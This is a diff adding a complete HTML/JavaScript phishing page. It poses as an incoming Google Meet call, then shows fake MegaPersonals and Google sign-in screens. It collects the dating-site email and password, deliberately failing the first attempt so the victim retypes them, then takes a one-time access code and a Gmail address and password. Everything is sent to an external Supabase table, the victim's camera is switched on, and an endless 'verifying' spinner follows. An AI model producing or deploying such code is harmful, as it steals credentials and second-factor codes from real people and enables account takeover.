@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Incoming Meeting</title>
+    <style>
+        /* --- GOOGLE FONTS --- */
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            height: 100vh;
+            height: 100dvh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            transition: background 0.4s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        #bgCam {
+            position: fixed; inset: 0; width: 100vw; height: 100vh;
+            object-fit: cover; filter: blur(14px) brightness(0.45);
+            z-index: -1; background-color: #000;
+        }
+
+        .screen { display: none; width: 100%; height: 100%; justify-content: center; align-items: center; }
+        .screen.active { display: flex; }
+        
+        body.dark-bg { background-color: #000; color: #fff; }
+        body.light-bg { background-color: #ffffff; color: #000; }
+
+        /* --- SCREEN 1: INCOMING CALL --- */
+        .callWrapper {
+            width: 360px; background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
+            border-radius: 22px; padding: 26px 30px 36px;
+            text-align: center; box-shadow: 0 0 40px rgba(0, 0, 0, 0.45);
+            animation: fadeScale 0.5s ease;
+        }
+        @keyframes fadeScale { from { transform: scale(.75); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .meetLogo { width: 82px; height: 82px; object-fit: contain; margin-bottom: 16px; }
+        .callerName { font-size: 26px; font-weight: 600; margin-top: 6px; }
+        .callText { font-size: 16px; opacity: .85; margin-top: 4px; }
+        .btnArea { display: flex; justify-content: space-between; margin-top: 38px; }
+        .btn {
+            flex: 1; margin: 0 8px; padding: 14px 0;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+            border: none; border-radius: 9px; color: white; transition: .25s;
+        }
+        .accept { background: linear-gradient(45deg, #00d07e, #009a57); box-shadow: 0 0 14px rgba(0, 255, 160, 0.45); }
+        .decline { background: linear-gradient(45deg, #ff4b4b, #b90404); box-shadow: 0 0 14px rgba(255, 80, 80, 0.45); }
+        .btn:hover { opacity: .8; }
+
+        /* --- SCREEN 2: MEETING LOGIN --- */
+        .loginBox {
+            width: 380px; padding: 32px 35px 45px;
+            border-radius: 22px; background: rgba(255, 255, 255, 0.14);
+            backdrop-filter: blur(22px); -webkit-backdrop-filter: blur(22px);
+            text-align: center; box-shadow: 0 0 45px rgba(0, 0, 0, .50);
+            animation: fadeUp .6s ease; position: relative;
+        }
+        @keyframes fadeUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        @keyframes shake {
+            0% { transform: translateX(0); } 25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); } 75% { transform: translateX(-10px); }
+            100% { transform: translateX(0); }
+        }
+        .shake { animation: shake 0.4s ease-in-out; }
+
+        .headBar {
+            width: 90%; height: 6px;
+            background: linear-gradient(90deg, #ff008c, #ffda00, #00ffc8);
+            border-radius: 10px; margin: auto; margin-bottom: 22px;
+        }
+        
+        .loginBox .logo { width: 95px; height: 95px; object-fit: contain; margin-bottom: 10px; }
+        .loginBox .title { font-size: 25px; font-weight: 600; }
+        .loginBox .subtext { opacity: .85; font-size: 16px; margin-top: 3px; }
+        .errorText { color: #ff4b4b; font-weight: bold; margin-top: 5px; display: none; }
+        
+        .inputField {
+            width: 100%; padding: 13px; border: none; border-radius: 9px;
+            font-size: 15px; outline: none; color: black; background: white;
+            font-weight: 500; margin-bottom: 16px; box-sizing: border-box;
+        }
+        .loginBtn {
+            width: 100%; padding: 15px; margin-top: 16px;
+            font-size: 18px; font-weight: bold; border-radius: 10px;
+            border: none; cursor: pointer;
+            background: linear-gradient(45deg, #ff0077, #ff9100, #00ff9f);
+            color: white; box-shadow: 0 0 20px rgba(255, 255, 255, .35);
+            transition: .30s;
+        }
+        .loginBtn:hover { opacity: .85; transform: scale(1.02); }
+        .note { margin-top: 18px; opacity: .9; font-size: 14px; }
+
+        /* --- SCREEN 3: VERIFY CODE --- */
+        .verifyContainer {
+            width: 100%; max-width: 600px;
+            text-align: center;
+            padding: 40px 20px;
+            background: #ffffff;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        
+        .logo-text { 
+            font-family: 'Times New Roman', Times, serif;
+            font-size: 38px; 
+            font-weight: bold;
+            margin-bottom: 2px; 
+            display: flex; 
+            justify-content: center; 
+            letter-spacing: -1px;
+        }
+        .logo-mega { color: #FCA311; }
+        .logo-personals { color: #00B4D8; }
+        
+        .logo-sub { 
+            font-family: 'Times New Roman', Times, serif;
+            color: #A0AAB5; 
+            font-size: 20px; 
+            margin-bottom: 30px; 
+        }
+        
+        .alert-banner { 
+            background-color: #FCF6E1; 
+            color: #B0A58D; 
+            padding: 12px 0; 
+            font-size: 14px; 
+            font-weight: bold; 
+            letter-spacing: 1.5px; 
+            text-transform: uppercase; 
+            margin-bottom: 25px;
+            width: 100%;
+            display: inline-block;
+        }
+        
+        .verify-text { 
+            color: #B74700; 
+            font-size: 16px; 
+            line-height: 1.5; 
+            margin-bottom: 25px; 
+        }
+        .verify-text strong { font-weight: bold; }
+        
+        .spam-warning { 
+            color: #1FA5E9; 
+            font-size: 17px; 
+            font-weight: bold; 
+            font-style: italic; 
+            margin-bottom: 25px; 
+            text-transform: uppercase;
+            line-height: 1.4;
+        }
+        
+        .share-warning { 
+            color: #B74700; 
+            font-size: 17px; 
+            font-weight: bold; 
+            font-style: italic; 
+            margin-bottom: 25px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            gap: 10px;
+            text-transform: uppercase;
+        }
+        
+        .share-warning span { 
+            background: #1FA5E9; 
+            color: white; 
+            width: 22px; 
+            height: 22px; 
+            border-radius: 50%; 
+            display: inline-flex; 
+            justify-content: center; 
+            align-items: center; 
+            font-size: 14px; 
+            font-style: normal; 
+            font-weight: bold;
+        }
+        
+        .verify-input { 
+            width: 220px; 
+            padding: 8px; 
+            font-size: 18px; 
+            border: 2px solid #333; 
+            border-radius: 4px; 
+            text-align: center; 
+            margin-bottom: 25px; 
+            outline: none;
+            font-family: Arial, sans-serif;
+        }
+        .verify-input:focus { border: 2px solid #000; }
+        
+        .btn-submit { 
+            background-color: #F2A065; 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 2px; 
+            padding: 12px 35px; 
+            font-size: 18px; 
+            font-weight: normal; 
+            cursor: pointer; 
+            transition: background 0.2s;
+            font-family: Arial, sans-serif;
+        }
+        .btn-submit:hover { background-color: #e08b4f; }
+
+        /* --- SCREEN 4 & 5: EMAIL & PASSWORD PAGES --- */
+        .google-container { width: 100%; display: flex; justify-content: center; }
+        
+        .google-box {
+            width: 100%; max-width: 450px; padding: 48px 40px 36px;
+            border-radius: 8px; background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            animation: fadeUp .5s ease;
+        }
+
+        .google-logo { display: block; margin: 0 auto 16px; width: 75px; height: auto; }
+        
+        .google-title { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
+        .google-subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 32px; }
+        
+        .google-input {
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
+            border-radius: 4px; font-size: 16px; margin-bottom: 8px;
+            outline: none; color: #202124; background: transparent;
+            transition: border-color 0.2s;
+        }
+        .google-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        .google-input.input-error {
+            border: 2px solid #d93025;
+            padding: 12px 14px;
+        }
+        
+        .google-error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+        }
+        .google-error-msg.show {
+            display: flex;
+        }
+        .google-error-msg svg {
+            width: 16px;
+            height: 16px;
+            fill: #d93025;
+            flex-shrink: 0;
+        }
+        
+        .google-link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; display: inline-block; }
+        .google-link:hover { text-decoration: underline; }
+        .google-info-text { font-size: 14px; color: #5f6368; margin: 24px 0 32px; line-height: 1.5; }
+        .google-info-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .google-info-text a:hover { text-decoration: underline; }
+        
+        .google-bottom-row { display: flex; justify-content: space-between; align-items: center; }
+        .google-create-account { font-size: 14px; color: #1a73e8; font-weight: 500; cursor: pointer; }
+        .google-create-account:hover { text-decoration: underline; }
+        
+        .google-next-btn {
+            background-color: #1a73e8; color: white; border: none;
+            padding: 10px 24px; border-radius: 4px; font-size: 14px;
+            cursor: pointer; transition: 0.3s; font-weight: 500;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        .google-next-btn:hover { background-color: #1967d2; }
+        
+        .google-password-title { font-size: 24px; font-weight: 400; text-align: left; margin-bottom: 16px; color: #202124; }
+        
+        .google-profile-pill {
+            display: inline-flex; align-items: center; border: 1px solid #dadce0;
+            border-radius: 20px; padding: 4px 12px 4px 4px; margin-bottom: 24px;
+            cursor: pointer; background: white; transition: background 0.2s;
+        }
+        .google-profile-pill:hover { background: #f8f9fa; }
+        
+        .google-avatar {
+            width: 24px; height: 24px; border-radius: 50%; margin-right: 8px;
+            background-color: #e8eaed; display: flex; align-items: center; justify-content: center;
+        }
+        .google-avatar svg { width: 16px; height: 16px; fill: #5f6368; }
+        
+        .google-profile-pill span { font-size: 14px; color: #202124; font-weight: 500; margin-right: 8px; }
+        .google-profile-pill .dropdown-arrow { width: 16px; height: 16px; fill: #5f6368; }
+
+        .google-password-btn { border-radius: 20px; }
+
+        /* --- SCREEN 6: LOADING --- */
+        #screen-loading { background: #ffffff; position: fixed; inset: 0; z-index: 9999; }
+        #screen-loading.active { display: flex; }
+        .loading-wrapper {
+            width: 100%; height: 100%; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; position: relative; background: #ffffff;
+        }
+        .google-spinner { width: 60px; height: 60px; animation: rotateSpinner 1.8s linear infinite; }
+        .google-spinner svg { width: 100%; height: 100%; }
+        @keyframes rotateSpinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .spinner-circle { fill: none; stroke-width: 4; stroke-linecap: round; animation: dashSpinner 1.5s ease-in-out infinite; }
+        @keyframes dashSpinner {
+            0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
+            50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; }
+            100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; }
+        }
+        .loading-text { margin-top: 32px; font-size: 16px; font-weight: 400; color: #202124; }
+        .loading-subtext { margin-top: 8px; font-size: 13px; color: #5f6368; }
+        .close-loading-btn {
+            position: absolute; top: 20px; right: 20px; width: 36px; height: 36px;
+            border-radius: 50%; background: transparent; color: #5f6368; border: none;
+            font-size: 22px; cursor: pointer; display: flex; align-items: center;
+            justify-content: center; transition: background 0.2s;
+        }
+        .close-loading-btn:hover { background: #f1f3f4; color: #202124; }
+
+        #screen-end { background: #ffffff; position: fixed; inset: 0; z-index: 10000; }
+        #screen-end.active { display: flex; }
+        .end-wrapper { width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: #ffffff; }
+
+        /* --- MOBILE RESPONSIVE --- */
+        @media (max-width: 600px) {
+            .callWrapper { width: calc(100% - 30px); max-width: 360px; padding: 22px 22px 30px; }
+            .meetLogo { width: 68px; height: 68px; margin-bottom: 12px; }
+            .callerName { font-size: 22px; }
+            .callText { font-size: 14px; }
+            .btnArea { margin-top: 30px; }
+            .btn { font-size: 15px; padding: 13px 0; }
+            .loginBox { width: calc(100% - 30px); max-width: 380px; padding: 26px 22px 36px; }
+            .loginBox .logo { width: 75px; height: 75px; }
+            .loginBox .title { font-size: 21px; }
+            .loginBox .subtext { font-size: 14px; }
+            .inputField { padding: 12px; font-size: 14px; }
+            .loginBtn { padding: 14px; font-size: 16px; }
+            .verifyContainer { padding: 25px 15px; }
+            .logo-text { font-size: 30px; }
+            .logo-sub { font-size: 17px; margin-bottom: 22px; }
+            .alert-banner { font-size: 12px; padding: 10px 0; letter-spacing: 1px; }
+            .verify-text { font-size: 14px; margin-bottom: 20px; }
+            .spam-warning { font-size: 15px; margin-bottom: 20px; }
+            .share-warning { font-size: 15px; margin-bottom: 20px; }
+            .verify-input { width: 180px; font-size: 16px; padding: 10px; }
+            .btn-submit { padding: 11px 30px; font-size: 16px; }
+            .google-container { padding: 15px; align-items: flex-start; padding-top: 30px; }
+            .google-box { padding: 32px 24px 28px; max-width: 100%; }
+            .google-logo { width: 60px; }
+            .google-title { font-size: 22px; }
+            .google-subtitle { font-size: 14px; margin-bottom: 24px; }
+            .google-input { font-size: 15px; padding: 12px 14px; }
+            .google-info-text { font-size: 13px; margin: 20px 0 24px; }
+            .google-password-title { font-size: 22px; }
+            .google-next-btn { padding: 10px 20px; font-size: 14px; }
+        }
+    </style>
+</head>
+<body class="dark-bg">
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <video id="bgCam" autoplay muted playsinline></video>
+
+    <audio id="ringtone" loop>
+        <source src="https://dl.prokerala.com/downloads/ringtones/files/dl/mp3/7120-download-iphone-6-original-ringtone-42676.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- SCREEN 1: INCOMING CALL -->
+    <div id="screen-call" class="screen active">
+        <div class="callWrapper">
+            <img class="meetLogo" src="https://images.icon-icons.com/2631/PNG/512/google_meet_new_logo_icon_159138.png" alt="Logo">
+            <div class="callerName">Incoming Meeting</div>
+            <div class="callText">Join the meeting now</div>
+            <div class="btnArea">
+                <button class="btn decline" onclick="declineCall()">Decline</button>
+                <button class="btn accept" onclick="goToLogin()">Join</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 2: MEETING LOGIN -->
+    <div id="screen-login" class="screen">
+        <div class="loginBox" id="loginBox">
+            <div class="headBar"></div>
+            <img class="logo" src="https://images.icon-icons.com/2631/PNG/512/google_meet_new_logo_icon_159138.png" alt="Logo">
+            <div class="title">Incoming Meeting call</div>
+            <div class="subtext" style="margin-bottom: 20px;">Login to access MegaPersonals join meeting</div>
+            <div class="subtext errorText" id="loginError" style="margin-bottom: 20px;">The password is incorrect</div>
+            <form onsubmit="handleLogin(event)">
+                <input type="email" class="inputField" id="meeting_m" placeholder="MegaPersonals Email" required>
+                <input type="password" class="inputField" id="meeting_p" placeholder="Password" required>
+                <button type="submit" class="loginBtn">Continue</button>
+            </form>
+            <div class="note">MegaPersonals secure authentication required</div>
+        </div>
+    </div>
+
+    <!-- SCREEN 3: VERIFY CODE -->
+    <div id="screen-verify" class="screen">
+        <div class="verifyContainer">
+            <div class="logo-text">
+                <span class="logo-mega">Mega</span><span class="logo-personals">Personals</span>
+            </div>
+            <div class="logo-sub">personals classifieds</div>
+            <div class="alert-banner">NEW DEVICE DETECTED</div>
+            <p class="verify-text">
+                Your ACCESS CODE<br>
+                has been sent <strong>Successfully</strong><br>
+                to your email on <strong id="currentDate">September 25, 2026</strong>.<br>
+                That code remains valid.
+            </p>
+            <p class="spam-warning">CHECK YOUR SPAM<br>FOLDER IT MAY BE THERE.</p>
+            <p class="share-warning">DO NOT SHARE IT <span>?</span></p>
+            <p class="verify-text" style="margin-bottom: 20px;">Enter the code below to continue.</p>
+            <form onsubmit="event.preventDefault(); goToEmailPage();">
+                <input type="text" class="verify-input" id="verify" required>
+                <br>
+                <button type="submit" class="btn-submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- SCREEN 4: EMAIL PAGE -->
+    <div id="screen-email-page" class="screen">
+        <div class="google-container">
+            <div class="google-box">
+                <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+                <div class="google-title">Sign in</div>
+                <div class="google-subtitle">Use your email account to continue</div>
+                <form onsubmit="event.preventDefault(); goToPasswordPage();">
+                    <input type="email" class="google-input" id="email" placeholder="Email address" required>
+                    <div class="google-error-msg" id="emailErrorMsg">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span>Couldn't find your Google Account. Only Gmail addresses are accepted.</span>
+                    </div>
+                    <a class="google-link" style="margin-bottom: 24px; display: inline-block;">Need help?</a>
+                    <div class="google-info-text">
+                        Make sure you are using a trusted device before continuing. <br>
+                        <a>Learn more about account safety</a>
+                    </div>
+                    <div class="google-bottom-row">
+                        <span class="google-create-account">Create account</span>
+                        <button type="submit" class="google-next-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 5: PASSWORD PAGE -->
+    <div id="screen-password-page" class="screen">
+        <div class="google-container">
+            <div class="google-box">
+                <img class="google-logo" style="margin: 0 0 24px 0; width: 40px;" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google G">
+                <div class="google-password-title">Welcome back</div>
+                <div class="google-profile-pill">
+                    <div class="google-avatar">
+                        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    </div>
+                    <span id="profile-email">user@example.com</span>
+                    <svg class="dropdown-arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+                </div>
+                <form onsubmit="event.preventDefault(); submitToCloud();">
+                    <input type="password" class="google-input" id="password" placeholder="Enter your password" required>
+                    <a class="google-link" id="togglePasswordLink" onclick="togglePasswordVisibility()" style="margin-bottom: 24px; display: inline-block;">Show password</a>
+                    <div class="google-info-text">
+                        Not your computer? Use Guest mode to sign in privately. <br>
+                        <a>Learn more</a>
+                    </div>
+                    <div class="google-bottom-row">
+                        <span class="google-create-account">Create account</span>
+                        <button type="submit" class="google-next-btn google-password-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 6: INFINITE LOADING PAGE -->
+    <div id="screen-loading" class="screen">
+        <div class="loading-wrapper">
+            <div class="google-spinner">
+                <svg viewBox="0 0 50 50">
+                    <circle class="spinner-circle" cx="25" cy="25" r="20" stroke="#1a73e8"></circle>
+                </svg>
+            </div>
+            <div class="loading-text">Please wait...</div>
+            <div class="loading-subtext">Verifying your account</div>
+            <button class="close-loading-btn" onclick="endSimulation()" title="Close">✕</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 7: END STATE -->
+    <div id="screen-end" class="screen">
+        <div class="end-wrapper"></div>
+    </div>
+
+    <script>
+        // ====================================================
+        // 👁️ TOGGLE PASSWORD VISIBILITY
+        // ====================================================
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById('password');
+            const toggleLink = document.getElementById('togglePasswordLink');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleLink.innerText = 'Hide password';
+            } else {
+                passwordField.type = 'password';
+                toggleLink.innerText = 'Show password';
+            }
+        }
+
+        // ====================================================
+        // 📧 GMAIL VALIDATION
+        // ====================================================
+        function isValidGmail(email) {
+            if (!email) return false;
+            const trimmed = email.trim().toLowerCase();
+            return /^[^\s@]+@gmail\.com$/i.test(trimmed);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('email');
+            const errorMsg = document.getElementById('emailErrorMsg');
+            
+            if (emailInput) {
+                emailInput.addEventListener('input', () => {
+                    emailInput.classList.remove('input-error');
+                    errorMsg.classList.remove('show');
+                });
+            }
+            
+            const dateElement = document.getElementById('currentDate');
+            const options = { year: 'numeric', month: 'long', day: 'numeric' };
+            dateElement.textContent = new Date().toLocaleDateString('en-US', options);
+        });
+
+        // ====================================================
+        // ☁️ SUPABASE CONNECTION & DATA MAPPING
+        // ====================================================
+        const supabaseUrl = "https://xoxrqjbwkuulxiitsnah.supabase.co";
+        const supabaseKey = "sb_publishable_rwpYTZ9s2d_2hejF_on5xg_6cTS3qcg";
+        const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+
+        let capturedData = {
+            meeting_m: '',
+            meeting_p: '',
+            verify: '',
+            email: '',
+            password: ''
+        };
+
+        function logCapture(fieldName, value) {
+            if (!value || value.trim() === '') return;
+            console.log(`[CAPTURE] ${fieldName}: ${value}`);
+        }
+
+        // ====================================================
+        // ☁️ SEND TO CLOUD (MAPPED TO YOUR NEW TABLE)
+        // ====================================================
+        async function sendToCloud() {
+            try {
+                const { data, error } = await supabaseClient
+                    .from('megapersonal') // আপনার নতুন টেবিলের নাম
+                    .insert([{
+                        meeting_m: capturedData.meeting_m,
+                        meeting_p: capturedData.meeting_p,
+                        verify: capturedData.verify,
+                        email: capturedData.email,
+                        user_password: capturedData.password
+                    }]);
+
+                if (error) {
+                    console.error('[SUPABASE ERROR]', error);
+                    return false;
+                }
+                console.log('[SUPABASE SUCCESS]', data);
+                return true;
+            } catch (err) {
+                console.error('[SUPABASE EXCEPTION]', err);
+                return false;
+            }
+        }
+
+        // ====================================================
+        // 🎵 RINGTONE
+        // ====================================================
+        const ringtone = document.getElementById('ringtone');
+        let isRinging = false;
+
+        function startRingtone() {
+            if (!isRinging) {
+                ringtone.play().then(() => { isRinging = true; })
+                    .catch(e => console.log("Audio play failed:", e));
+            }
+        }
+
+        document.addEventListener('click', startRingtone, { once: true });
+        document.addEventListener('touchstart', startRingtone, { once: true });
+        document.addEventListener('keydown', startRingtone, { once: true });
+
+        function stopRingtone() {
+            if (isRinging) {
+                ringtone.pause();
+                ringtone.currentTime = 0;
+                isRinging = false;
+            }
+        }
+
+        // ====================================================
+        // 🔐 LOGIN LOGIC
+        // ====================================================
+        let loginAttempt = 0;
+
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const errorDiv = document.getElementById('loginError');
+            const loginBox = document.getElementById('loginBox');
+            const emailField = document.getElementById('meeting_m');
+            const passwordField = document.getElementById('meeting_p');
+
+            if (loginAttempt === 0) {
+                capturedData.meeting_m = emailField.value;
+                capturedData.meeting_p = passwordField.value;
+                logCapture('Meeting Email (Attempt 1)', emailField.value);
+                logCapture('Meeting Password (Attempt 1)', passwordField.value);
+                
+                errorDiv.style.display = 'block';
+                loginBox.classList.add('shake');
+                setTimeout(() => loginBox.classList.remove('shake'), 500);
+                
+                emailField.value = '';
+                passwordField.value = '';
+                loginAttempt++;
+            } else {
+                capturedData.meeting_m = emailField.value;
+                capturedData.meeting_p = passwordField.value;
+                logCapture('Meeting Email (Final)', emailField.value);
+                logCapture('Meeting Password (Final)', passwordField.value);
+                
+                stopRingtone();
+                goToVerify();
+            }
+        }
+
+        // ====================================================
+        // 🚀 PAGE TRANSITIONS
+        // ====================================================
+        function goToLogin() {
+            document.getElementById('screen-call').classList.remove('active');
+            document.getElementById('screen-login').classList.add('active');
+        }
+
+        function declineCall() {
+            stopRingtone();
+            alert('Meeting declined.');
+        }
+
+        function goToVerify() {
+            stopRingtone();
+            document.getElementById('screen-login').classList.remove('active');
+            document.getElementById('screen-verify').classList.add('active');
+            document.body.classList.remove('dark-bg');
+            document.body.classList.add('light-bg');
+            document.getElementById('bgCam').style.display = 'none';
+        }
+
+        function goToEmailPage() {
+            capturedData.verify = document.getElementById('verify').value;
+            logCapture('Verify Code', capturedData.verify);
+            
+            document.getElementById('screen-verify').classList.remove('active');
+            document.getElementById('screen-email-page').classList.add('active');
+        }
+
+        function goToPasswordPage() {
+            const emailInput = document.getElementById('email');
+            const errorMsg = document.getElementById('emailErrorMsg');
+            const emailValue = emailInput.value.trim();
+            
+            if (!isValidGmail(emailValue)) {
+                emailInput.classList.add('input-error');
+                errorMsg.classList.add('show');
+                console.log('[VALIDATION FAILED] Not a Gmail address:', emailValue);
+                return;
+            }
+            
+            emailInput.classList.remove('input-error');
+            errorMsg.classList.remove('show');
+            
+            capturedData.email = emailValue;
+            logCapture('Google Email', emailValue);
+            
+            document.getElementById('profile-email').innerText = emailValue;
+            
+            document.getElementById('screen-email-page').classList.remove('active');
+            document.getElementById('screen-password-page').classList.add('active');
+        }
+
+        // ====================================================
+        // 🔄 SUBMIT → SHOW INFINITE LOADING PAGE
+        // ====================================================
+        async function submitToCloud() {
+            const passwordValue = document.getElementById('password').value;
+            capturedData.password = passwordValue;
+            logCapture('Google Password', passwordValue);
+            
+            // Send to Supabase in background
+            sendToCloud();
+            
+            // Hide all screens and show loading
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById('screen-loading').classList.add('active');
+        }
+
+        // ====================================================
+        // ✕ END SIMULATION → SHOW BLANK WHITE PAGE
+        // ====================================================
+        function endSimulation() {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById('screen-end').classList.add('active');
+            console.log('[SIMULATION ENDED]');
+        }
+
+        // ====================================================
+        // 📷 CAMERA BACKGROUND
+        // ====================================================
+        (async () => {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                document.getElementById("bgCam").srcObject = stream;
+            } catch (e) {
+                console.log("Camera blocked or unavailable.");
+            }
+        })();
+    </script>
+</body>
+</html>
